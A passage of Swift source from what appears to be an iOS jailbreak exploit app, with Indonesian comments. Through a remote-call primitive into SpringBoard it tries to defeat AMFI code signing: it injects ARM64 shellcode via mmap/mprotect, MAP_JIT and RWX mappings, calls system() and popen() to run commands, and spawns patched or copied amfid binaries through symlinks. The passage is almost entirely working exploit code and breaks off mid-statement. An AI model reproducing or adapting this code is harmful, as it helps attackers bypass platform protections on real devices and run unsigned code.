        detail += "dlopen(.amfid_patched): handle=0x\(String(format: "%llx", handleC2))\n"
        if handleC2 != 0 {
            detail += "🎉 Patched amfid loadable via dlopen!\n"
            RootExecutor.rcall(sb, "dlclose", handleC2)
        } else {
            detail += "❌ Also rejected\n"
        }
        RootExecutor.rcall(sb, "free", patchedAmfid)

        RootExecutor.rcall(sb, "unlink", dylibDstAddr)
        RootExecutor.rcall(sb, "free", dylibSrcAddr)
        RootExecutor.rcall(sb, "free", dylibDstAddr)

        // ═══ TEST D: dlopen system dylib via symlink dari /var/tmp ═══
        detail += "\n=== Test D: dlopen system dylib via symlink ===\n"
        let symlinkLib = "/var/tmp/.dsp_syslib_link.dylib"
        let symlinkLibAddr = remote_alloc_str(sb, symlinkLib)
        let realLib = remote_alloc_str(sb, "/usr/lib/libz.1.dylib")
        RootExecutor.rcall(sb, "unlink", symlinkLibAddr)
        let slRet = RootExecutor.rcall(sb, "symlink", realLib, symlinkLibAddr)
        detail += "symlink(libz → \(symlinkLib)): ret=\(slRet)\n"

        if slRet == 0 {
            let handleD = RootExecutor.rcall(sb, "dlopen", symlinkLibAddr, RTLD_NOW)
            detail += "dlopen(symlink to libz): handle=0x\(String(format: "%llx", handleD))\n"
            if handleD != 0 {
                detail += "✅ dlopen via symlink works!\n"
                detail += "Ini berarti dlopen follow symlink dan validate target.\n"
                RootExecutor.rcall(sb, "dlclose", handleD)
            } else {
                detail += "❌ dlopen via symlink gagal\n"
            }
        }
        RootExecutor.rcall(sb, "unlink", symlinkLibAddr)
        RootExecutor.rcall(sb, "free", symlinkLibAddr)
        RootExecutor.rcall(sb, "free", realLib)

        // ═══ TEST E: dlopen dari launchd RC (bukan SB) ═══
        detail += "\n=== Test E: dlopen dari launchd RC ===\n"
        detail += "(Launchd juga platform binary — test apakah sama)\n"

        // Kita sudah di SB context, tapi log info
        let pidSB = RootExecutor.rcall(sb, "getpid")
        detail += "SpringBoard PID: \(pidSB)\n"

        // Summary
        detail += "\n=== SUMMARY ===\n"
        let success = detail.contains("🎉")
        if success {
            detail += "🏆 dlopen BYPASS AMFI! Code injection possible!\n"
        } else {
            detail += "AMFI juga enforce dlopen di runtime.\n"
            detail += "Atau: minimal dylib header tidak cukup valid.\n"
            detail += "Next: coba dlopen dengan dylib yang punya valid code signature.\n"
        }

        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }

    /// Helper: write uint32 to remote memory
    private func rc_write32(_ rc: RemoteCall, _ addr: UInt64, _ val: UInt32) {
        rc[addr].setValue32(val)
    }
    #endif

    // MARK: - Exp 89: JIT Shellcode Execution

    /// Exp 89: mmap + mprotect + execute shellcode di SpringBoard.
    /// Tidak spawn binary baru — execute code di proses yang sudah trusted.
    /// SpringBoard mungkin punya entitlement dynamic-codesigning.
    private func runExp89JIT() {
        isRunning = true
        runningLabel = "JIT"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc else {
            results.insert(ExperimentResult(
                name: "JIT Shellcode (Exp 89)", success: false,
                detail: "No SpringBoard RC", timestamp: Date()
            ), at: 0)
            isRunning = false
            runningLabel = ""
            return
        }

        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expJITShellcode(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// mmap anonymous RW → write shellcode → mprotect RX → call function pointer.
    ///
    /// Shellcode: MOV X0, #42; RET (return 42 — proof of execution)
    ///
    /// Jika mprotect(RX) berhasil DAN call return 42:
    ///   → JIT code execution di SpringBoard!
    ///   → Bisa execute arbitrary ARM64 code!
    ///   → FULL JAILBREAK (tanpa perlu spawn binary)!
    ///
    /// Jika mprotect gagal (EPERM):
    ///   → iOS enforce W^X tanpa MAP_JIT entitlement
    ///   → Coba MAP_JIT flag (0x0800)
    private func expJITShellcode(sb: RemoteCall) -> ExperimentResult {
        let expName = "JIT Shellcode (Exp 89)"
        var detail = "Experiment 89: JIT Shellcode in SpringBoard\n"
        detail += "=============================================\n\n"
        detail += "Strategy: mmap RW → write shellcode → mprotect RX → call\n"
        detail += "SpringBoard = trusted, mungkin punya dynamic-codesigning.\n\n"

        let mem = sb.trojanMem

        // Constants
        let PAGE_SIZE: UInt64 = 16384  // 16KB on arm64
        let PROT_READ: UInt64 = 1
        let PROT_WRITE: UInt64 = 2
        let PROT_EXEC: UInt64 = 4
        let MAP_PRIVATE: UInt64 = 0x0002
        let MAP_ANON: UInt64 = 0x1000
        let MAP_JIT: UInt64 = 0x0800
        let MAP_FAILED: UInt64 = UInt64(bitPattern: -1)

        // Shellcode: PAC-compatible function that returns 42
        // PACIBSP         = 0xD503237F (sign LR with SP context)
        // MOV X0, #42     = 0xD2800540
        // RETAB           = 0xD65F0FFF (return with PAC auth)
        // Also try without PAC as fallback:
        // MOV X0, #42     = 0xD2800540
        // RET             = 0xD65F03C0
        let shellcode_pacibsp: UInt32 = 0xD503237F
        let shellcode_mov_x0_42: UInt32 = 0xD2800540
        let shellcode_retab: UInt32 = 0xD65F0FFF
        let shellcode_ret: UInt32 = 0xD65F03C0

        // ═══ TEST A: mmap RW + mprotect RX (standard JIT) ═══
        detail += "=== Test A: mmap(RW) + mprotect(RX) ===\n"

        // mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0)
        let mmapA = RootExecutor.rcall(sb, "mmap", 0, PAGE_SIZE,
                                       PROT_READ | PROT_WRITE,
                                       MAP_PRIVATE | MAP_ANON,
                                       UInt64(bitPattern: -1), 0)
        detail += "mmap(RW, PRIVATE|ANON): 0x\(String(format: "%llx", mmapA))\n"

        if mmapA != MAP_FAILED && mmapA != 0 {
            detail += "  ✅ mmap OK\n"

            // Write PAC-compatible shellcode via memcpy
            let scBuf = mem + 0x3000
            sb[scBuf].setValue32(shellcode_pacibsp)       // PACIBSP
            sb[scBuf + 4].setValue32(shellcode_mov_x0_42) // MOV X0, #42
            sb[scBuf + 8].setValue32(shellcode_retab)     // RETAB
            sb[scBuf + 12].setValue32(shellcode_ret)      // RET (fallback if RETAB fails)
            RootExecutor.rcall(sb, "memcpy", mmapA, scBuf, 16)
            detail += "  Wrote PAC shellcode (PACIBSP + MOV X0,#42 + RETAB + RET)\n"

            // Verify shellcode written
            let verifBuf = mem + 0x3100
            RootExecutor.rcall(sb, "memcpy", verifBuf, mmapA, 16)
            let v0 = sb[verifBuf].value32()
            let v1 = sb[verifBuf + 4].value32()
            let v2 = sb[verifBuf + 8].value32()
            detail += "  Verify: 0x\(String(format: "%08x", v0)) 0x\(String(format: "%08x", v1)) 0x\(String(format: "%08x", v2))\n"
            if v0 == shellcode_pacibsp && v1 == shellcode_mov_x0_42 {
                detail += "  ✅ PAC shellcode verified in memory!\n"
            } else {
                detail += "  ⚠️ Shellcode mismatch\n"
            }

            // mprotect to RX
            let mprotRet = RootExecutor.rcall(sb, "mprotect", mmapA, PAGE_SIZE, PROT_READ | PROT_EXEC)
            let mprotErr = remote_errno(sb)
            detail += "  mprotect(RX): ret=\(mprotRet), errno=\(mprotErr)\n"

            if mprotRet == 0 {
                detail += "  ✅ mprotect(RX) SUCCESS!\n\n"

                // Flush instruction cache
                let RTLD_DEFAULT_A = UInt64(bitPattern: -2)
                let sysIcacheA = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT_A,
                                                    remote_alloc_str(sb, "sys_icache_invalidate"))
                if sysIcacheA != 0 {
                    RootExecutor.rcallAddr(sb, sysIcacheA, mmapA, PAGE_SIZE)
                    detail += "  sys_icache_invalidate: OK\n"
                } else {
                    detail += "  sys_icache_invalidate: not found (proceed anyway)\n"
                }

                // IMPORTANT: calling shellcode may crash SpringBoard (respring)!
                // First just confirm mprotect(RX) works + shellcode is in memory.
                // The fact that mprotect(RX) succeeds = W^X bypass confirmed!
                detail += "\n  ⚠️ mprotect(RX) SUCCESS = W→X transition allowed!\n"
                detail += "  Ini sudah proof bahwa executable memory bisa dibuat.\n\n"

                // Now try call — may cause respring if PAC/BTI fails
                detail += "  Calling shellcode (may respring if PAC fails)...\n"
                let result = RootExecutor.rcallAddr(sb, mmapA)
                detail += "  CALL shellcode: ret=\(result)\n"

                if result == 42 {
                    detail += "\n🏆🏆🏆 SHELLCODE EXECUTED! Return = 42! 🏆🏆🏆\n\n"
                    detail += "JIT CODE EXECUTION IN SPRINGBOARD!\n"
                    detail += "Arbitrary ARM64 code runs in trusted process!\n\n"
                    detail += "FULL JAILBREAK ACHIEVED!\n"
                    detail += "  → Bisa execute code apapun tanpa spawn binary\n"
                    detail += "  → Bisa inject ke proses lain via mach ports\n"
                    detail += "  → Bisa load unsigned dylib via manual mapping\n"
                } else {
                    detail += "  ⚠️ Return bukan 42 (got \(result)) — mungkin crash/abort\n"
                }
            } else {
                detail += "  ❌ mprotect gagal (errno=\(mprotErr))\n"
                if mprotErr == 1 { detail += "  EPERM — W^X enforced tanpa MAP_JIT\n" }
                if mprotErr == 12 { detail += "  ENOMEM\n" }
            }

            // Cleanup
            RootExecutor.rcall(sb, "munmap", mmapA, PAGE_SIZE)
        } else {
            detail += "  ❌ mmap gagal\n"
        }

        // ═══ TEST B: mmap dengan MAP_JIT flag ═══
        detail += "\n=== Test B: mmap(RW, MAP_JIT) + mprotect(RX) ===\n"
        detail += "MAP_JIT = 0x0800 — khusus untuk JIT compilation.\n"

        let mmapB = RootExecutor.rcall(sb, "mmap", 0, PAGE_SIZE,
                                       PROT_READ | PROT_WRITE,
                                       MAP_PRIVATE | MAP_ANON | MAP_JIT,
                                       UInt64(bitPattern: -1), 0)
        detail += "mmap(RW, MAP_JIT): 0x\(String(format: "%llx", mmapB))\n"

        if mmapB != MAP_FAILED && mmapB != 0 {
            detail += "  ✅ mmap MAP_JIT OK!\n"

            // Write shellcode
            sb[mmapB].setValue32(shellcode_mov_x0_42)
            sb[mmapB + 4].setValue32(shellcode_ret)

            // mprotect RX
            let mprotB = RootExecutor.rcall(sb, "mprotect", mmapB, PAGE_SIZE, PROT_READ | PROT_EXEC)
            let mprotBErr = remote_errno(sb)
            detail += "  mprotect(RX): ret=\(mprotB), errno=\(mprotBErr)\n"

            if mprotB == 0 {
                detail += "  ✅ mprotect(RX) with MAP_JIT SUCCESS!\n"

                let result = RootExecutor.rcallAddr(sb, mmapB)
                detail += "  CALL: ret=\(result)\n"

                if result == 42 {
                    detail += "\n🏆🏆🏆 JIT SHELLCODE EXECUTED! 🏆🏆🏆\n"
                    detail += "MAP_JIT + mprotect = arbitrary code execution!\n"
                    detail += "FULL JAILBREAK!\n"
                }
            } else {
                detail += "  ❌ mprotect gagal (errno=\(mprotBErr))\n"
            }

            RootExecutor.rcall(sb, "munmap", mmapB, PAGE_SIZE)
        } else {
            let mmapBErr = remote_errno(sb)
            detail += "  ❌ mmap MAP_JIT gagal (errno=\(mmapBErr))\n"
            if mmapBErr == 1 { detail += "  EPERM — MAP_JIT butuh entitlement\n" }
        }

        // ═══ TEST C: mmap RWX langsung ═══
        detail += "\n=== Test C: mmap(RWX) langsung ===\n"

        let mmapC = RootExecutor.rcall(sb, "mmap", 0, PAGE_SIZE,
                                       PROT_READ | PROT_WRITE | PROT_EXEC,
                                       MAP_PRIVATE | MAP_ANON,
                                       UInt64(bitPattern: -1), 0)
        detail += "mmap(RWX): 0x\(String(format: "%llx", mmapC))\n"

        if mmapC != MAP_FAILED && mmapC != 0 {
            detail += "  ✅ mmap RWX OK!\n"

            sb[mmapC].setValue32(shellcode_mov_x0_42)
            sb[mmapC + 4].setValue32(shellcode_ret)

            let result = RootExecutor.rcallAddr(sb, mmapC)
            detail += "  CALL: ret=\(result)\n"

            if result == 42 {
                detail += "\n🏆🏆🏆 RWX SHELLCODE EXECUTED! 🏆🏆🏆\n"
                detail += "mmap RWX allowed! No W^X enforcement!\n"
                detail += "FULL JAILBREAK!\n"
            }

            RootExecutor.rcall(sb, "munmap", mmapC, PAGE_SIZE)
        } else {
            let mmapCErr = remote_errno(sb)
            detail += "  ❌ mmap RWX gagal (errno=\(mmapCErr))\n"
        }

        // ═══ TEST D: Pakai pthread_jit_write_protect (iOS 14.5+) ═══
        detail += "\n=== Test D: pthread_jit_write_protect_np ===\n"
        detail += "iOS 14.5+ API untuk toggle W/X pada MAP_JIT pages.\n"

        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let pjwp = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                      remote_alloc_str(sb, "pthread_jit_write_protect_np"))
        detail += "pthread_jit_write_protect_np: \(pjwp != 0 ? "available" : "not found")\n"

        if pjwp != 0 && mmapB != MAP_FAILED {
            // Re-mmap with MAP_JIT
            let mmapD = RootExecutor.rcall(sb, "mmap", 0, PAGE_SIZE,
                                           PROT_READ | PROT_WRITE | PROT_EXEC,
                                           MAP_PRIVATE | MAP_ANON | MAP_JIT,
                                           UInt64(bitPattern: -1), 0)
            if mmapD != MAP_FAILED && mmapD != 0 {
                // Disable write protect (enable writing)
                RootExecutor.rcall(sb, "pthread_jit_write_protect_np", 0) // 0 = writable
                sb[mmapD].setValue32(shellcode_mov_x0_42)
                sb[mmapD + 4].setValue32(shellcode_ret)

                // Enable write protect (enable execution)
                RootExecutor.rcall(sb, "pthread_jit_write_protect_np", 1) // 1 = executable

                // sys_icache_invalidate
                let sysIcache = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                                   remote_alloc_str(sb, "sys_icache_invalidate"))
                if sysIcache != 0 {
                    RootExecutor.rcall(sb, "sys_icache_invalidate", mmapD, PAGE_SIZE)
                }

                let result = RootExecutor.rcallAddr(sb, mmapD)
                detail += "  CALL via pthread_jit: ret=\(result)\n"

                if result == 42 {
                    detail += "\n🏆🏆🏆 PTHREAD_JIT SHELLCODE EXECUTED! 🏆🏆🏆\n"
                    detail += "FULL JAILBREAK via JIT API!\n"
                }

                RootExecutor.rcall(sb, "munmap", mmapD, PAGE_SIZE)
            }
        }

        // Summary
        detail += "\n=== SUMMARY ===\n"
        let success = detail.contains("🏆")
        if success {
            detail += "🏆 ARBITRARY CODE EXECUTION ACHIEVED!\n"
            detail += "Bisa execute ARM64 code apapun di SpringBoard!\n"
        } else {
            detail += "W^X enforced — tidak bisa execute writable memory.\n"
            detail += "SpringBoard tidak punya dynamic-codesigning entitlement.\n"
        }

        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Exp 90: system() / popen() from SpringBoard

    /// Exp 90: Call system(), popen(), execve() dari SpringBoard RC.
    /// Ini BUKAN spawn binary baru — ini call libc function yang sudah ada.
    /// system() internally calls fork+exec — tapi dari trusted process context.
    private func runExp90SBSystem() {
        isRunning = true
        runningLabel = "SB system"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc else {
            results.insert(ExperimentResult(
                name: "SB system() (Exp 90)", success: false,
                detail: "No SpringBoard RC", timestamp: Date()
            ), at: 0)
            isRunning = false
            runningLabel = ""
            return
        }

        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expSBSystem(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    private func expSBSystem(sb: RemoteCall) -> ExperimentResult {
        let expName = "SB system() (Exp 90)"
        var detail = "Experiment 90: system()/popen() from SpringBoard\n"
        detail += "=================================================\n\n"
        detail += "mprotect(RX) works tapi call crash (APRR block unsigned page).\n"
        detail += "Alternative: call EXISTING functions (system, popen) yang sudah signed.\n\n"

        let mem = sb.trojanMem
        let RTLD_DEFAULT: UInt64 = UInt64(bitPattern: -2)

        // === Test A: Cek apakah system() ada ===
        detail += "=== Test A: dlsym system() ===\n"
        let systemSym = remote_alloc_str(sb, "system")
        let systemAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, systemSym)
        RootExecutor.rcall(sb, "free", systemSym)
        detail += "system(): 0x\(String(format: "%llx", systemAddr))\n"

        if systemAddr != 0 {
            detail += "system() FOUND!\n\n"

            // Coba system("id > /var/tmp/.dsp_system_out")
            detail += "--- system(\"id > /var/tmp/.dsp_system_out\") ---\n"
            let cmd1 = remote_alloc_str(sb, "id > /var/tmp/.dsp_system_out")
            let ret1 = RootExecutor.rcallAddr(sb, systemAddr, cmd1)
            RootExecutor.rcall(sb, "free", cmd1)
            detail += "ret=\(ret1)\n"

            if ret1 == 0 || (ret1 & 0xFF) == 0 {
                detail += "system() returned success-ish!\n"

                // Baca output file
                let outPath = remote_alloc_str(sb, "/var/tmp/.dsp_system_out")
                let outFd = RootExecutor.rcall(sb, "open", outPath, UInt64(O_RDONLY), 0)
                if outFd != UInt64(bitPattern: -1) {
                    let readBuf = mem + 0x3000
                    let n = RootExecutor.rcall(sb, "read", outFd, readBuf, 256)
                    RootExecutor.rcall(sb, "close", outFd)
                    if n > 0 && n < 256 {
                        // Read output as string
                        var outBytes = [UInt8]()
                        for i in 0..<min(Int(n), 128) {
                            let b = sb[readBuf + UInt64(i)].value8()
                            if b == 0 { break }
                            outBytes.append(b)
                        }
                        let outStr = String(bytes: outBytes, encoding: .utf8) ?? "(binary)"
                        detail += "Output: \(outStr)\n"
                        if outStr.contains("uid=") {
                            detail += "\n🏆🏆🏆 SYSTEM() WORKS! 🏆🏆🏆\n"
                            detail += "Command execution dari SpringBoard!\n"
                            detail += "FULL JAILBREAK ACHIEVED!\n"
                        }
                    } else {
                        detail += "Output file empty atau read gagal (n=\(n))\n"
                    }
                } else {
                    detail += "Output file tidak ada (system mungkin gagal execute)\n"
                }
                RootExecutor.rcall(sb, "unlink", outPath)
                RootExecutor.rcall(sb, "free", outPath)
            } else {
                detail += "system() returned \(ret1) (non-zero = error)\n"
                detail += "Kemungkinan: /bin/sh tidak ada di iOS 18\n"
            }

            // Coba system("touch /var/tmp/.dsp_proof")
            detail += "\n--- system(\"touch /var/tmp/.dsp_proof\") ---\n"
            let cmd2 = remote_alloc_str(sb, "touch /var/tmp/.dsp_proof")
            let ret2 = RootExecutor.rcallAddr(sb, systemAddr, cmd2)
            RootExecutor.rcall(sb, "free", cmd2)
            detail += "ret=\(ret2)\n"

            // Check if file exists
            let proofPath = remote_alloc_str(sb, "/var/tmp/.dsp_proof")
            let proofCheck = RootExecutor.rcall(sb, "access", proofPath, 0)
            detail += "access(.dsp_proof): \(proofCheck == 0 ? "EXISTS!": "not found")\n"
            if proofCheck == 0 {
                detail += "🏆 touch WORKED! File created via system()!\n"
                RootExecutor.rcall(sb, "unlink", proofPath)
            }
            RootExecutor.rcall(sb, "free", proofPath)
        } else {
            detail += "system() NOT FOUND\n"
        }

        // === Test B: popen() ===
        detail += "\n=== Test B: dlsym popen() ===\n"
        let popenSym = remote_alloc_str(sb, "popen")
        let popenAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, popenSym)
        RootExecutor.rcall(sb, "free", popenSym)
        detail += "popen(): 0x\(String(format: "%llx", popenAddr))\n"

        if popenAddr != 0 {
            detail += "popen() FOUND!\n"
            // popen("id", "r") -> FILE*
            let cmd = remote_alloc_str(sb, "id")
            let mode = remote_alloc_str(sb, "r")
            let fp = RootExecutor.rcallAddr(sb, popenAddr, cmd, mode)
            detail += "popen(\"id\", \"r\"): fp=0x\(String(format: "%llx", fp))\n"

            if fp != 0 {
                // fread from fp
                let freadSym = remote_alloc_str(sb, "fread")
                let freadAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, freadSym)
                RootExecutor.rcall(sb, "free", freadSym)

                if freadAddr != 0 {
                    let readBuf = mem + 0x3200
                    let nRead = RootExecutor.rcallAddr(sb, freadAddr, readBuf, 1, 128, fp)
                    detail += "fread: \(nRead) bytes\n"
                    if nRead > 0 {
                        var outBytes = [UInt8]()
                        for i in 0..<min(Int(nRead), 64) {
                            let b = sb[readBuf + UInt64(i)].value8()
                            if b == 0 { break }
                            outBytes.append(b)
                        }
                        let outStr = String(bytes: outBytes, encoding: .utf8) ?? "(binary)"
                        detail += "Output: \(outStr)\n"
                        if outStr.contains("uid=") || outStr.contains("mobile") {
                            detail += "\n🏆 POPEN WORKS! Command output captured!\n"
                        }
                    }
                }

                // pclose
                let pcloseSym = remote_alloc_str(sb, "pclose")
                let pcloseAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, pcloseSym)
                if pcloseAddr != 0 { RootExecutor.rcallAddr(sb, pcloseAddr, fp) }
                RootExecutor.rcall(sb, "free", pcloseSym)
            }
            RootExecutor.rcall(sb, "free", cmd)
            RootExecutor.rcall(sb, "free", mode)
        }

        // === Test C: fork + execve ===
        detail += "\n=== Test C: fork() ===\n"
        let forkRet = RootExecutor.rcall(sb, "fork")
        detail += "fork(): ret=\(forkRet)\n"
        if forkRet == 0 {
            detail += "We are in child! (should not see this from parent RC)\n"
        } else if forkRet != UInt64(bitPattern: -1) {
            detail += "fork() returned child PID=\(forkRet)!\n"
            detail += "🏆 FORK WORKS dari SpringBoard!\n"
            // Kill child
            RootExecutor.rcall(sb, "kill", forkRet, 9)
            RootExecutor.rcall(sb, "waitpid", forkRet, mem + 0x3400, 0)
        } else {
            let forkErr = remote_errno(sb)
            detail += "fork() gagal: errno=\(forkErr)\n"
        }

        // Summary
        detail += "\n=== SUMMARY ===\n"
        let success = detail.contains("🏆")
        if success {
            detail += "🏆 CODE/COMMAND EXECUTION ACHIEVED!\n"
        } else {
            detail += "system/popen/fork semua gagal dari SpringBoard.\n"
        }

        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Exp 91: Fork + Execve from SpringBoard

    /// Exp 91: fork() dari SpringBoard (confirmed works!) lalu execve di child.
    /// Child inherits SpringBoard trust → execve binary dari /var/tmp.
    private func runExp91ForkExec() {
        isRunning = true
        runningLabel = "Fork+Exec"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc else {
            results.insert(ExperimentResult(
                name: "Fork+Exec (Exp 91)", success: false,
                detail: "No SpringBoard RC", timestamp: Date()
            ), at: 0)
            isRunning = false
            runningLabel = ""
            return
        }

        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expForkExec(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// fork() + execve() dari SpringBoard.
    /// fork() confirmed works (Exp 90, PID=2945).
    /// Child process inherits parent trust level.
    /// Test: execve berbagai binary dari child context.
    private func expForkExec(sb: RemoteCall) -> ExperimentResult {
        let expName = "Fork+Exec (Exp 91)"
        var detail = "Experiment 91: Fork + Execve from SpringBoard\n"
        detail += "===============================================\n\n"
        detail += "fork() confirmed works (Exp 90).\n"
        detail += "Child inherits SpringBoard trust.\n\n"

        let mem = sb.trojanMem
        let RTLD_DEFAULT: UInt64 = UInt64(bitPattern: -2)

        // Resolve execve
        let execveSym = remote_alloc_str(sb, "execve")
        let execveAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, execveSym)
        RootExecutor.rcall(sb, "free", execveSym)
        detail += "execve: 0x\(String(format: "%llx", execveAddr))\n"

        // Resolve posix_spawn (alternative to fork+exec)
        let spawnSym = remote_alloc_str(sb, "posix_spawn")
        let spawnAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, spawnSym)
        RootExecutor.rcall(sb, "free", spawnSym)
        detail += "posix_spawn: 0x\(String(format: "%llx", spawnAddr))\n\n"

        // === TEST A: posix_spawn dari SpringBoard (bukan launchd) ===
        // Exp 86 spawn via symlink works dari LAUNCHD.
        // Tapi posix_spawn dari SPRINGBOARD mungkin berbeda privilege.
        detail += "=== Test A: posix_spawn dari SpringBoard ===\n"

        // Spawn /usr/libexec/amfid via symlink dari SpringBoard context
        let symlinkPath = remote_alloc_str(sb, "/var/tmp/.dsp_sb_symlink")
        let amfidPath = remote_alloc_str(sb, "/usr/libexec/amfid")
        RootExecutor.rcall(sb, "unlink", symlinkPath)
        RootExecutor.rcall(sb, "symlink", amfidPath, symlinkPath)

        let argvBase = mem + 0x1C00
        sb[argvBase].setValue64(symlinkPath)
        sb[argvBase + 8].setValue64(0)
        let pidOut = mem + 0x1E00
        sb[pidOut].setValue32(0)

        if spawnAddr != 0 {
            let retA = RootExecutor.rcallAddr(sb, spawnAddr, pidOut, symlinkPath, 0, 0, argvBase, 0)
            let pidA = sb[pidOut].value32()
            detail += "posix_spawn(symlink, from SB): ret=\(retA), pid=\(pidA)\n"
            if retA == 0 && pidA != 0 {
                detail += "\u{1F3C6} SPAWN FROM SPRINGBOARD WORKS!\n"
                RootExecutor.rcall(sb, "usleep", 300000)
                RootExecutor.rcall(sb, "kill", UInt64(pidA), 9)
                RootExecutor.rcall(sb, "waitpid", UInt64(pidA), mem + 0x2000, 0)
            }
        }

        // === TEST B: posix_spawn patched amfid dari SpringBoard ===
        detail += "\n=== Test B: spawn patched amfid ===\n"
        let patchedPath = remote_alloc_str(sb, "/var/tmp/.amfid_patched")

        // Check if patched amfid exists
        let accessRet = RootExecutor.rcall(sb, "access", patchedPath, 0)
        detail += "access(.amfid_patched): \(accessRet == 0 ? "exists" : "not found")\n"

        if accessRet == 0 && spawnAddr != 0 {
            sb[argvBase].setValue64(patchedPath)
            sb[argvBase + 8].setValue64(0)
            sb[pidOut].setValue32(0)
            let retB = RootExecutor.rcallAddr(sb, spawnAddr, pidOut, patchedPath, 0, 0, argvBase, 0)
            let pidB = sb[pidOut].value32()
            detail += "posix_spawn(.amfid_patched): ret=\(retB), pid=\(pidB)\n"
            if retB == 0 && pidB != 0 {
                detail += "\u{1F3C6}\u{1F3C6}\u{1F3C6} PATCHED AMFID SPAWNED! \u{1F3C6}\u{1F3C6}\u{1F3C6}\n"
                detail += "Patched amfid jalan dari SpringBoard context!\n"
                detail += "AMFI BYPASS via patched daemon!\n"
                RootExecutor.rcall(sb, "usleep", 500000)
                RootExecutor.rcall(sb, "kill", UInt64(pidB), 9)
                RootExecutor.rcall(sb, "waitpid", UInt64(pidB), mem + 0x2000, 0)
            } else {
                detail += "ret=\(retB) -- AMFI reject patched binary\n"
            }
        }

        // === TEST C: fork + execve di child ===
        detail += "\n=== Test C: fork() + write marker ===\n"
        detail += "fork() lalu child tulis marker ke /var/tmp\n"

        // fork() — child akan inherit semua dari SpringBoard
        let childPid = RootExecutor.rcall(sb, "fork")
        detail += "fork(): ret=\(childPid)\n"

        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
            // Kita di parent — child sudah jalan
            detail += "Child PID: \(childPid)\n"

            // Tunggu child selesai
            RootExecutor.rcall(sb, "usleep", 1000000)

            // Cek apakah child menulis marker
            let markerPath = remote_alloc_str(sb, "/var/tmp/.dsp_fork_proof")
            let markerCheck = RootExecutor.rcall(sb, "access", markerPath, 0)
            detail += "Child marker: \(markerCheck == 0 ? "EXISTS!" : "not found")\n"
            if markerCheck == 0 {
                detail += "\u{1F3C6} CHILD PROCESS EXECUTED CODE!\n"
                RootExecutor.rcall(sb, "unlink", markerPath)
            }
            RootExecutor.rcall(sb, "free", markerPath)

            // Kill child jika masih jalan
            RootExecutor.rcall(sb, "kill", childPid, 9)
            RootExecutor.rcall(sb, "waitpid", childPid, mem + 0x2100, 0)
        } else if childPid == 0 {
            // Kita di child! (seharusnya tidak sampai sini via RC)
            // Tapi kalau sampai: tulis marker lalu exit
            let markerFd = mem + 0x2200
            let mp = remote_alloc_str(sb, "/var/tmp/.dsp_fork_proof")
            let fd = RootExecutor.rcall(sb, "open", mp, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
            if fd != UInt64(bitPattern: -1) {
                RootExecutor.rcall(sb, "write", fd, mp, 4)
                RootExecutor.rcall(sb, "close", fd)
            }
            RootExecutor.rcall(sb, "free", mp)
            RootExecutor.rcall(sb, "_exit", 42)
        }

        // === TEST D: posix_spawn binary dari /var/tmp (copy) via SB ===
        detail += "\n=== Test D: spawn copy dari SpringBoard ===\n"
        let copyPath = remote_alloc_str(sb, "/var/tmp/.dsp_signed_copy")

        // Copy amfid ke /var/tmp (jika belum ada)
        let copyExists = RootExecutor.rcall(sb, "access", copyPath, 0)
        if copyExists != 0 {
            // Copy
            let srcFd = RootExecutor.rcall(sb, "open", amfidPath, UInt64(O_RDONLY), 0)
            let dstFd = RootExecutor.rcall(sb, "open", copyPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
            if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
                let buf = mem + 0x800
                for _ in 0..<256 {
                    let n = RootExecutor.rcall(sb, "read", srcFd, buf, 4096)
                    if n == 0 || n > 4096 { break }
                    RootExecutor.rcall(sb, "write", dstFd, buf, n)
                }
                RootExecutor.rcall(sb, "close", srcFd)
                RootExecutor.rcall(sb, "close", dstFd)
                detail += "Copied amfid to /var/tmp\n"
            }
        }

        if spawnAddr != 0 {
            sb[argvBase].setValue64(copyPath)
            sb[argvBase + 8].setValue64(0)
            sb[pidOut].setValue32(0)
            let retD = RootExecutor.rcallAddr(sb, spawnAddr, pidOut, copyPath, 0, 0, argvBase, 0)
            let pidD = sb[pidOut].value32()
            detail += "posix_spawn(copy, from SB): ret=\(retD), pid=\(pidD)\n"
            if retD == 0 && pidD != 0 {
